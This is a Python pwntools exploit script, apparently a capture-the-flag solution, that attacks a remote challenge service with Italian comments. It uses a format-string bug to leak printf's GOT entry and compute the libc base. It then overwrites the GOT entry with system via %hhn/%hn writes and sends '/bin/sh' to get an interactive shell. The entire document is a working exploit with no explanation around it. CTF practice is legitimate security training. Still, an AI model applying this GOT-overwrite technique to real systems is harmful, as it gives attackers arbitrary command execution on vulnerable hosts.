from pwn import *

r = remote("knife.challs.olicyber.it", 11006)
libc = ELF("./libc6_2.35-0ubuntu3.10_amd64.so", checksec=False)
libc.address = 0

def load(where):
    r.sendline(f"LOAD {where}".encode())
    r.recvuntil(b"LOAD ")
    return r.recvline().strip()

def store(where, what):
    r.sendline(f"STORE {where} ".encode() + what)
    r.recv(1000)

store("1", p64(0x404048))

printf_addr = u64(load("%9$s").ljust(8, b"\0"))

# ----- Calcolo base libc -----
libc_base = printf_addr - libc.symbols["printf"]
print(f"BASE LIBC: {hex(libc_base)}")

system = libc_base + libc.symbols["system"]
print(f"SYS: {hex(system)}")

# ----- Uso format string vul per modificare got di printf (tutto in una righa sennò esplode) -----
store("1", p64(0x404048))
store("2", p64(0x40404a))

byte1 = ((system >> 16) & 0xff) - 5
byte2 = (system & 0xffff) - byte1
payload = f"%{byte1}c%10$hhn%{byte2}c%9$hn"
load(payload)

r.sendline(b"/bin/sh")

r.interactive()